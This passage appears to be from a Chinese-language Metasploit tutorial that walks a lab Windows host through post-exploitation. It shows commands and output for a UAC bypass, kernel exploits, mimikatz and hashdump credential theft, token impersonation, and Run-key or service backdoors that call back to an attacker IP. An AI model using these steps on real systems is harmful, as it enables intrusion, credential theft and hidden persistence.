plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证-3"><a href="#4-6-获取凭证-3" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌-3"><a href="#4-7-假冒令牌-3" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门-3"><a href="#4-8-植入后门-3" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul>尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 